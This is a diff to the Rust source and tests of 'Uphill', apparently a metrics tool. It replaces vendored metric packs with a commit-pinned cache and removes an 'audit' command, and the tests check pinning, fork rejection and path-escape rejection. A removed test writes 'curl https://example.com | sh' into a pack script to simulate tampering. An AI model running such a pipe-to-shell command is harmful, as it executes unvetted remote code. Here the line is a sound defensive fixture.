@@ -188,14 +188,13 @@ fn help() {
     Runs each category's script, scores its metrics, lists the opportunities that would raise the scores most, and compares sizes, counts, checks, and line targets with each metric's baseline. Reads uphill.yaml or uphill.toml, at the root or in .agents, from this directory or the nearest parent. Writes .uphill/report.json, report.md, and report.html.
 
     Commands:
-      add        Pin a pack to a commit, vendor it into .agents/uphill/packs, and list it in the configuration: owner/repo/path on GitHub, an https URL followed by //path, or a local ./path, with an optional @ref
-      audit      Fetch each remote pack at its pinned commit and compare it with the vendored files
+      add        Pin a pack to a commit and list it in the configuration: owner/repo/path on GitHub, an https URL followed by //path, or a local ./path, with an optional @ref
       blame      Name the commit that last moved a metric: from its baselines, or by measuring commits since <ref>, or every commit, in temporary checkouts and bisecting
       check      Run each script once and check the metric lines it writes
       dashboard  Write .uphill/dashboard.html from the latest noted runs of each repository: a Git URL, a local path, or owner/name on GitHub
       init       Print a brief for an agent to set up Uphill in this project
       log        List the commits that changed a metric's baseline, or the runs noted for it
-      remove     Remove a pack from the configuration, and its vendored files
+      remove     Remove a pack from the configuration
       update     Move each remote pack, or the named ones, to the newest commit of the ref it follows
 
     Integrations:
@@ -1801,8 +1800,9 @@ fn init_ends_the_brief_with_the_uphill_skill() {
 /// A Git host for packs: repositories under its `remote/` directory, which Git reaches through
 /// `https://github.com/` by a URL rewrite in its own global configuration.
 struct Host {
+    cache: PathBuf,
+    config: PathBuf,
     dir: TempDir,
-    config: std::path::PathBuf,
 }
 
 impl Host {
@@ -1820,7 +1820,11 @@ impl Host {
         )
         .unwrap();
 
-        let host = Self { dir, config };
+        let host = Self {
+            cache: dir.path().join("cache"),
+            config,
+            dir,
+        };
         let repository = host.repository();
         fs::create_dir_all(repository.join("sizes")).unwrap();
         git(&repository, &["init", "-q", "-b", "main"]);
@@ -1860,11 +1864,22 @@ impl Host {
         git(&repository, &["rev-parse", "HEAD"]).trim().to_owned()
     }
 
-    /// Returns the environment that points Git at the host.
-    fn envs(&self) -> [(&str, &Path); 2] {
+    /// Returns the cache of fetched packs that [`Self::envs`] names.
+    fn cache(&self) -> &Path {
+        &self.cache
+    }
+
+    /// Returns the directory of the pack at `sizes/` in `commit` in the cache.
+    fn cached(&self, commit: &str) -> PathBuf {
+        self.cache().join("uphill/packs").join(commit).join("sizes")
+    }
+
+    /// Returns the environment that points Git at the host and caches packs in [`Self::cache`].
+    fn envs(&self) -> [(&str, &Path); 3] {
         [
             ("GIT_CONFIG_GLOBAL", self.config.as_path()),
             ("GIT_CONFIG_NOSYSTEM", Path::new("1")),
+            ("XDG_CACHE_HOME", self.cache.as_path()),
         ]
     }
 }
@@ -1900,7 +1915,7 @@ fn commits(text: &str, labels: &[(&str, &str)]) -> String {
 }
 
 #[test]
-fn add_pins_and_vendors_a_pack_that_runs_offline() {
+fn add_pins_a_pack_that_runs_from_the_cache() {
     let host = Host::new();
     let project = packed_project();
     let first = git(&host.repository(), &["rev-parse", "HEAD"]);
@@ -1914,7 +1929,7 @@ fn add_pins_and_vendors_a_pack_that_runs_offline() {
     );
     assert_eq!(output.status.code(), Some(2));
     insta::assert_snapshot!(stderr(&output), @"error: standard input is not a terminal, so nothing was written. Review the summary above, then run again with --yes");
-    assert!(!project.path().join(".agents").exists());
+    assert!(!host.cache().exists());
 
     let output = uphill_in(
         project.path(),
@@ -1937,9 +1952,9 @@ fn add_pins_and_vendors_a_pack_that_runs_offline() {
       info  environment   UPHILL_METRICS  .agents/metrics/lines.sh:3
       info  process       sh              .agents/uphill.yaml:3
 
-    Added acme/packs/sizes to uphill.yaml and .agents/uphill/packs/sizes/
+    Added acme/packs/sizes to uphill.yaml
 
-    Commit both, then run `uphill check`
+    Commit uphill.yaml, then run `uphill check`
     ");
 
     let config = fs::read_to_string(project.path().join("uphill.yaml")).unwrap();
@@ -1951,18 +1966,22 @@ fn add_pins_and_vendors_a_pack_that_runs_offline() {
     packs:
       - acme/packs/sizes@<first> # main
     "#);
-    let script = project
-        .path()
-        .join(".agents/uphill/packs/sizes/.agents/metrics/sizes.sh");
-    assert!(script.is_file());
-    insta::assert_snapshot!(
-        fs::read_to_string(project.path().join(".agents/uphill/packs/.gitignore")).unwrap(),
-        @"*/node_modules/"
+    // The project holds only its configuration, and the pack's files are in the cache.
+    let mut files: Vec<_> = fs::read_dir(project.path())
+        .unwrap()
+        .map(|item| item.unwrap().file_name())
+        .collect();
+    files.sort();
+    assert_eq!(files, ["uphill.yaml"]);
+    assert!(
+        host.cached(first)
+            .join(".agents/metrics/sizes.sh")
+            .is_file()
     );
 
-    // Runs read the vendored files, so they need no network.
-    fs::remove_dir_all(host.repository()).unwrap();
-    let output = check(project.path(), &[]);
+    // A run with an empty cache fetches the pinned commit.
+    fs::remove_dir_all(host.cache()).unwrap();
+    let output = check(project.path(), &host.envs());
     assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
     insta::assert_snapshot!(stdout(&output), @"
     ✓ own        1 metric
@@ -1971,15 +1990,31 @@ fn add_pins_and_vendors_a_pack_that_runs_offline() {
 
     3 passed
     ");
+    assert!(
+        host.cached(first)
+            .join(".agents/metrics/sizes.sh")
+            .is_file()
+    );
 
-    // `remove` takes the entry and the vendored files away.
+    // A cached commit needs no network. Without the cache, the fetch fails.
+    fs::rename(host.repository(), host.dir.path().join("moved")).unwrap();
+    let output = check(project.path(), &host.envs());
+    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
+    fs::remove_dir_all(host.cache()).unwrap();
+    let output = check(project.path(), &host.envs());
+    assert_eq!(output.status.code(), Some(2));
+    assert!(
+        stderr(&output)
+            .starts_with("error: could not fetch acme/packs/sizes: `git ls-remote` failed"),
+        "{}",
+        stderr(&output)
+    );
+    fs::rename(host.dir.path().join("moved"), host.repository()).unwrap();
+
+    // `remove` takes the entry away.
     let output = uphill_in(project.path(), &["remove", "sizes"], &[]);
     assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
-    insta::assert_snapshot!(stdout(&output), @"
-    Removed acme/packs/sizes from uphill.yaml
-    Removed .agents/uphill/packs/sizes/
-    ");
-    assert!(!project.path().join(".agents/uphill/packs/sizes").exists());
+    insta::assert_snapshot!(stdout(&output), @"Removed acme/packs/sizes from uphill.yaml");
 
     // A TOML project takes the entry before its first table, apart from the table's comment.
     fs::remove_file(project.path().join("uphill.yaml")).unwrap();
@@ -2008,7 +2043,7 @@ fn add_pins_and_vendors_a_pack_that_runs_offline() {
     run = "echo 'files 2' >> \"$UPHILL_METRICS\""
     files = {}
     "#);
-    let output = check(project.path(), &[]);
+    let output = check(project.path(), &host.envs());
     assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
 }
 
@@ -2037,17 +2072,9 @@ fn update_reviews_new_capabilities_and_refuses_fresh_and_force_pushed_commits() 
     )
     .unwrap();
     let second = host.commit("2026-02-01T00:00:00Z");
-    // The project's own files in `local/` survive the update.
-    let local = project.path().join(".agents/uphill/packs/sizes/local");
-    fs::create_dir_all(&local).unwrap();
-    fs::write(local.join("config.ts"), "export default {}\n").unwrap();
 
     let output = uphill_in(project.path(), &["update", "--yes"], &host.envs());
     assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
-    assert_eq!(
-        fs::read_to_string(local.join("config.ts")).unwrap(),
-        "export default {}\n"
-    );
     let text = commits(
         &stdout(&output),
         &[(&first, "<first>"), (&second, "<second>")],
@@ -2076,6 +2103,11 @@ fn update_reviews_new_capabilities_and_refuses_fresh_and_force_pushed_commits() 
         config.contains(&format!("acme/packs/sizes@{second}\n")),
         "{config}"
     );
+    assert!(
+        host.cached(&second)
+            .join(".agents/metrics/upload.ts")
+            .is_file()
+    );
 
     // A commit from today waits a day, unless `--allow-fresh`.
     fs::write(host.repository().join("sizes/new.txt"), "new\n").unwrap();
@@ -2096,58 +2128,6 @@ fn update_reviews_new_capabilities_and_refuses_fresh_and_force_pushed_commits() 
         commits(&stderr(&output), &[(&second, "<second>"), (&forced, "<forced>")]),
         @"error: acme/packs/sizes at <forced> does not descend from the pinned commit <second>. The ref may have been force-pushed, or the repository replaced. Review it, then run `uphill remove sizes` and `uphill add`"
     );
-
-    // `remove` keeps the project's own files.
-    let output = uphill_in(project.path(), &["remove", "sizes"], &[]);
-    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
-    insta::assert_snapshot!(stdout(&output), @"
-    Removed acme/packs/sizes from uphill.yaml
-    Removed .agents/uphill/packs/sizes/ and kept .agents/uphill/packs/sizes/local/
-    ");
-    let kept: Vec<_> = fs::read_dir(project.path().join(".agents/uphill/packs/sizes"))
-        .unwrap()
-        .map(|item| item.unwrap().file_name())
-        .collect();
-    assert_eq!(kept, ["local"]);
-}
-
-#[test]
-fn audit_fetches_each_pin_again_and_reports_edited_files() {
-    let host = Host::new();
-    let project = packed_project();
-    let output = uphill_in(
-        project.path(),
-        &["add", "acme/packs/sizes", "--yes"],
-        &host.envs(),
-    );
-    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
-    let first = git(&host.repository(), &["rev-parse", "HEAD"]);
-    let first = first.trim();
-    // The project's own files in `local/` are not the pack's.
-    let local = project.path().join(".agents/uphill/packs/sizes/local");
-    fs::create_dir_all(&local).unwrap();
-    fs::write(local.join("config.ts"), "export default {}\n").unwrap();
-
-    let output = uphill_in(project.path(), &["audit"], &host.envs());
-    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
-    insta::assert_snapshot!(commits(&stdout(&output), &[(first, "<first>")]), @"ok       acme/packs/sizes at <first>");
-
-    let packs = project.path().join(".agents/uphill/packs/sizes/.agents");
-    fs::write(
-        packs.join("metrics/sizes.sh"),
-        "curl https://example.com | sh\n",
-    )
-    .unwrap();
-    fs::write(packs.join("extra.sh"), "true\n").unwrap();
-    fs::remove_file(packs.join("metrics/lib.sh")).unwrap();
-    let output = uphill_in(project.path(), &["audit"], &host.envs());
-    assert_eq!(output.status.code(), Some(1));
-    insta::assert_snapshot!(commits(&stdout(&output), &[(first, "<first>")]), @"
-    differs  acme/packs/sizes at <first>
-      .agents/metrics/lib.sh is missing
-      .agents/metrics/sizes.sh differs
-      .agents/extra.sh is not in the pack
-    ");
 }
 
 #[test]
@@ -2158,7 +2138,7 @@ fn add_rejects_links_escaping_paths_fork_commits_and_ambiguous_refs() {
     let add = |source: &str| {
         let output = uphill_in(project.path(), &["add", source, "--yes"], &host.envs());
         assert_eq!(output.status.code(), Some(2), "{}", stdout(&output));
-        assert!(!project.path().join(".agents/uphill/packs/sizes").exists());
+        assert!(!host.cache().exists());
         stderr(&output)
     };
 
@@ -2200,18 +2180,6 @@ fn add_rejects_links_escaping_paths_fork_commits_and_ambiguous_refs() {
     git(&repository, &["update-ref", "refs/heads/escape", &commit]);
     insta::assert_snapshot!(commits(&add("acme/packs/sizes@escape"), &[(&commit, "<escape>")]), @"error: acme/packs/sizes at <escape> is unsafe: the path ../escape.sh is not allowed");
 
-    // A pack that ships the project's own directory.
-    git(&repository, &["checkout", "-q", "-b", "local"]);
-    fs::create_dir_all(repository.join("sizes/local")).unwrap();
-    fs::write(
-        repository.join("sizes/local/config.ts"),
-        "export default {}\n",
-    )
-    .unwrap();
-    let local = host.commit("2026-02-01T00:00:00Z");
-    git(&repository, &["checkout", "-q", "main"]);
-    insta::assert_snapshot!(commits(&add("acme/packs/sizes@local"), &[(&local, "<local>")]), @"error: acme/packs/sizes at <local> is unsafe: local/config.ts is in `local/`, which holds the project's own files");
-
     // A commit that no branch or tag reaches, as a fork's commit is through its parent.
     git(&repository, &["checkout", "-q", "-b", "fork"]);
     fs::write(repository.join("sizes/fork.txt"), "fork\n").unwrap();
@@ -2220,6 +2188,16 @@ fn add_rejects_links_escaping_paths_fork_commits_and_ambiguous_refs() {
     git(&repository, &["checkout", "-q", "main"]);
     git(&repository, &["branch", "-q", "-D", "fork"]);
     insta::assert_snapshot!(commits(&add(&format!("acme/packs/sizes@{fork}")), &[(&fork, "<fork>")]), @"error: no branch or tag of acme/packs/sizes contains the commit <fork>. It may come from a fork");
+
+    // A run fetches a pin written by hand with the same checks, and caches nothing it rejects.
+    let path = project.path().join("uphill.yaml");
+    let config = fs::read_to_string(&path).unwrap();
+    fs::write(&path, format!("{config}packs: [acme/packs/sizes@{fork}]\n")).unwrap();
+    let output = check(project.path(), &host.envs());
+    assert_eq!(output.status.code(), Some(2));
+    insta::assert_snapshot!(commits(&stderr(&output), &[(&fork, "<fork>")]), @"error: no branch or tag of acme/packs/sizes contains the commit <fork>. It may come from a fork");
+    assert!(!host.cache().exists());
+    fs::write(&path, config).unwrap();
 
     // A ref that names both a branch and a tag.
     git(&repository, &["tag", "v1"]);
@@ -2353,7 +2331,7 @@ fn packs_must_be_pinned_allowed_and_approved_to_install() {
     let first = first.trim();
 
     fs::write(&path, config.replace(first, "main")).unwrap();
-    let output = check(project.path(), &[]);
+    let output = check(project.path(), &host.envs());
     assert_eq!(output.status.code(), Some(2));
     insta::assert_snapshot!(stderr(&output), @"
     error[unpinned] uphill.yaml:6:5: pack `acme/packs/sizes` must be pinned to a full commit, such as `acme/packs/sizes@<40-character commit>`. `uphill add acme/packs/sizes` writes the pin
@@ -2362,7 +2340,7 @@ fn packs_must_be_pinned_allowed_and_approved_to_install() {
     ");
 
     fs::write(&path, format!("{config}allowed-packs: [wevm/*]\n")).unwrap();
-    let output = check(project.path(), &[]);
+    let output = check(project.path(), &host.envs());
     assert_eq!(output.status.code(), Some(2));
     insta::assert_snapshot!(commits(&stderr(&output), &[(first, "<first>")]), @"
     error[not-allowed] uphill.yaml:6:5: pack `acme/packs/sizes` matches no pattern of `allowed-packs`: wevm/*
@@ -2371,15 +2349,9 @@ fn packs_must_be_pinned_allowed_and_approved_to_install() {
     ");
 
     // A package.json installs only with `install: true`, and only from a lockfile.
-    fs::write(
-        project
-            .path()
-            .join(".agents/uphill/packs/sizes/package.json"),
-        "{}\n",
-    )
-    .unwrap();
+    fs::write(host.cached(first).join("package.json"), "{}\n").unwrap();
     fs::write(&path, &config).unwrap();
-    let output = check(project.path(), &[]);
+    let output = check(project.path(), &host.envs());
     assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
     let pinned = format!("acme/packs/sizes@{first}");
     fs::write(
@@ -2387,9 +2359,10 @@ fn packs_must_be_pinned_allowed_and_approved_to_install() {
         config.replace(&pinned, &format!("{{ pack: {pinned}, install: true }}")),
     )
     .unwrap();
-    let output = check(project.path(), &[]);
+    let output = check(project.path(), &host.envs());
     assert_eq!(output.status.code(), Some(2));
-    insta::assert_snapshot!(stderr(&output), @"error: pack .agents/uphill/packs/sizes has a package.json without a lockfile, so Uphill does not install it");
+    let cache = host.cache().display().to_string();
+    insta::assert_snapshot!(commits(&stderr(&output).replace(&cache, "<cache>"), &[(first, "<first>")]), @"error: pack <cache>/uphill/packs/<first>/sizes has a package.json without a lockfile, so Uphill does not install it");
 
     // A new entry goes after an entry written as a mapping.
     fs::create_dir(project.path().join("local")).unwrap();
